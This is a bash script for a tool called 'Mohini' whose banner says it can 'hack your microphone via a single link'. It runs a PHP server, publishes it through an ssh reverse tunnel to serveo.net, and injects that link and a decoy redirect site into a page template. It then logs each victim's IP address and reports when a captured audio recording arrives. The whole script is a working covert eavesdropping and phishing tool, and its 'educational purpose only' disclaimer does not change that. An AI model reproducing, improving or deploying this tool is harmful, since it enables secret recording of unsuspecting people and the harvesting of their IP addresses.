#!/bin/bash
# Mohini v1.0
# coded by: github.com/LxaNce-Hacker/Mohini
# Using Recorderjs by: https://github.com/mattdiamond/Recorderjs


__version__="1.0"

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"


trap 'printf "\n"; stop' 2
clear
banner() {
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⢶⣾⣿⣿⣾⣝⢿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠖⣢⣶⣿⣾⣎⣭⡻⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀       ${RED}Version : ${CYAN}${__version__}
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡿⢣⣾⣿⣿⣿⠟⠹⣿⣷⠹⣿⡀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣿⣿⣿⠃⣾⣿⣿⡟⠁⠀⠀⢻⣿⣇⢻⣧⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢀⣠⣾⢱⣿⣿⣿⢸⣿⣿⣿⠁⢀⣠⠤⠤⣿⣿⡘⣿⣇⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠈⠉⠉⣡⣿⣿⣿⠇⣾⣿⣿⠇⠀⢀⣴⣶⣶⠊⢿⣧⢻⣿⡄⠀⠀⠀⠀⠀       ${RED}Hi 👋,
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢠⣾⣿⡿⠟⣡⣾⣿⣿⡟⠀⠀⠀⠉⠉⠀⠀⣀⡻⣷⡹⣿⣦⣤⠀⠀⠀       ${RED}I am Mohini,
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢸⡏⣴⠿⠿⡿⠿⢟⣫⡏⠐⠶⠆⠀⠀⠀⣸⣿⢹⣝⢿⣶⡀⠀⠀⠀⠀       ${RED}I can hack your microphone via a single link...
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⣸⢻⡏⣾⣿⣿⣿⢿⡋⠀⢉⣉⡝⠀⠀⣰⣿⣿⡏⣿⣷⠻⣷⣄⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠠⠤⠞⣡⣿⣿⣿⢟⠸⣿⣦⣀⠀⢀⣠⡞⢻⣿⣿⣷⠘⢿⡄⠀⠉⠛⠒⠂       ${RED}Current Version : ${CYAN}${__version__}
    echo -e ${GREEN}⠀⠀⠀⠀⠀⢀⣠⣾⠿⢟⣫⡶⢫⠀⣿⡿⢿⣿⡿⠋⢠⣾⣿⣿⣿⡟⣮⠻⢤⣀⠀⠀⠀       ${RED}Supported : ${CYAN}Linux, Termux
    echo -e ${GREEN}⠀⠀⠀⠐⠋⠉⣱⢸⣿⣿⠏⣴⣿⡇⢸⣇⠀⠉⠁⢀⣿⡿⢿⣿⣿⡇⢹⣷⡀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⢀⣼⡇⢸⣿⡏⣼⣿⣿⡇⢸⣿⡄⠀⢀⡿⠁⠀⢸⣿⣿⡇⣼⣿⣷⠀⠀⠀⠀       ${RED}Developed by : ${CYAN}LxaNce-Hacker
    echo -e ${GREEN}⠀⠀⠀⢠⣿⣿⠇⢸⣿⡇⣿⣿⣿⡇⢸⡏⡇⠀⢸⠁⠀⢀⣾⣿⢟⣼⣿⠟⣫⡇⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⢸⣿⠃⣠⣾⣿⢀⣿⣿⣿⡇⡼⠀⣷⠀⣾⠀⢠⣾⡿⢣⣿⣿⣷⡙⢿⣷⡀⠀⠀
    echo -e ${GREEN}⠀⢀⣀⣾⣧⣾⣿⢿⣣⣾⣿⢿⣫⠆⠁⠀⡇⠀⢹⡀⠈⣿⣇⠈⠻⢿⣿⣿⣶⣹⣷⠀⠀       ${CYAN}NOTE:-
    echo -e ${GREEN}⠀⠀⠉⢱⣿⡏⣾⣿⢟⣫⣾⡟⠁⠀⠀⢰⣧⣄⣼⡇⠀⠸⣿⡀⠀⠀⢈⣿⣿⢻⡟⠀⠀       ${RED}This Tool is made for educational purpose only,
    echo -e ${GREEN}⢀⠀⠀⠀⣿⣧⢻⣿⡸⣿⣿⠀⠀⠀⠀⡸⠈⢿⠋⠹⡄⠀⣿⠇⠀⣴⣿⠟⠉⡿⠀⠀⠀       ${RED}Author will not be responsible for any misuse
    echo -e ${GREEN}⠙⠦⠤⣤⠾⢟⣤⡹⣿⣮⡻⣧⡀⠀⢀⡇⠀⠈⠀⠀⠙⣶⣿⠀⠀⠘⣿⡀⠘⠷⠄⠀⠀       ${RED}of this toolkit.
    echo -e ${GREEN}⠀⠀⠀⠀⣠⣿⣿⠿⠼⣿⣷⢼⠇⠀⡼⠀⠀⠀⠐⠒⠚⠛⠁⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⣿⡟⠀⠀⢠⣿⡿⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠛⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⣸⠟⠀⠀⣰⡿⠋⠀⠀⡰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠒⠚⠉⠀⠀⠀⣟⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

}

stop() {
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkssh=$(ps aux | grep -o "ssh" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkssh == *'ssh'* ]]; then
    killall -2 ssh > /dev/null 2>&1
  fi

  exit 1
}

dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

catch_ip() {
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Victim's IP : ${BLUE}$ip"
  cat ip.txt >> saved.ip.txt
}

checkfound() {
  printf "\n"
  echo -e "\n${RED}[${WHITE}*${RED}]${GREEN} Waiting targets, Press Ctrl+C to exit..."

  while [ true ]; do
    if [[ -e "ip.txt" ]]; then
      echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Target opened the link!\n"
      catch_ip
      rm -rf ip.txt
    fi

    sleep 0.5

    if [[ -e "Log.log" ]]; then
      echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Audio file received!\n"
      rm -rf Log.log
    fi

    sleep 0.5
  done
}

server() {
  command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting Serveo..."

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $subdomain_resp == true ]]; then
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
    sleep 8
  else
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
    sleep 8
  fi

  echo -e "${RED}[${WHITE}-${RED}]${GREEN} Starting php server...(localhost:3333)"
  fuser -k 3333/tcp > /dev/null 2>&1
  php -S localhost:3333 > /dev/null 2>&1 &
  sleep 3
  send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
  echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Direct link : ${BLUE}$send_link"
}


start1() {
  if [[ -e sendlink ]]; then
    rm -rf sendlink
  fi

  printf "\n"
  echo -e "\n${RED}[${WHITE}01${RED}]${GREEN} Serveo.net"
  echo -e "${RED}[${WHITE}02${RED}]${GREEN} Comming Soon...\n"
  default_option_server="1"
  read -p "${RED}[${WHITE}+${RED}]${ORANGE} Choose a port forwarding option :${BLUE} " option_server
  option_server="${option_server:-${default_option_server}}"

  default_redirect="https://lxance.xyz"
  read -p "${RED}[${WHITE}+${RED}]${GREEN} Choose a distracting website (Default: ${BLUE}$default_redirect${GREEN}) : ${BLUE}" redirect_link
  redirect_link="${redirect_link:-${default_redirect}}"

  if [[ $option_server -eq 1 ]]; then
    command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
    start
  elif [[ $option_server -eq 2 ]]; then
    comming_soon
  else
    echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} Invalid option!"
    sleep 1
    clear
    start1
  fi
}

payload() {
  send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
  sed 's+forwarding_link+'$send_link'+g' template.php > index.php
  sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
}

comming_soon() {
    echo -e "\n comming_soon..."
    exit
}
start() {
  default_choose_sub="Y"
  default_subdomain="lxance$RANDOM"

  read -p "${RED}[${WHITE}+${RED}]${GREEN} Choose subdomain? [Y/N] : " choose_sub
  choose_sub="${choose_sub:-${default_choose_sub}}"

  if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
    subdomain_resp=true
    read -p "${RED}[${WHITE}+${RED}]${GREEN} Subdomain (Default: ${BLUE}$default_subdomain${GREEN}) : ${BLUE}" subdomain
    subdomain="${subdomain:-${default_subdomain}}"
  fi

  server
  payload
  checkfound
}

banner
dependencies
start1
